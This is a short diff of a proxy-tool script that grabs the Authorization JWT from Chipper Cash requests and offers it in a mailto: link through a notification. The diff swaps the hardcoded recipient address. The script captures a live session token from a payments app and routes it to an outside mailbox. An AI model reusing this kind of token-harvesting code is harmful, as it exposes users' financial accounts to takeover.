@@ -8,7 +8,7 @@ if (req && req.headers) {
     let mailBody = `${authorization}`;
 
     // 构造 mailto: 链接，确保邮件主体被正确编码
-    let mailtoUrl = `mailto:niuniujun@argun.cc?subject=Chipper Cash JWT&body=${mailBody}`;
+    let mailtoUrl = `mailto:Argun@牛牛君?subject=Chipper Cash JWT&body=${mailBody}`;
 
     // 发送通知
     $notification.post("Chipper Cash JWT", "点击查看详情", "📧 发送到邮箱", { "url": mailtoUrl });
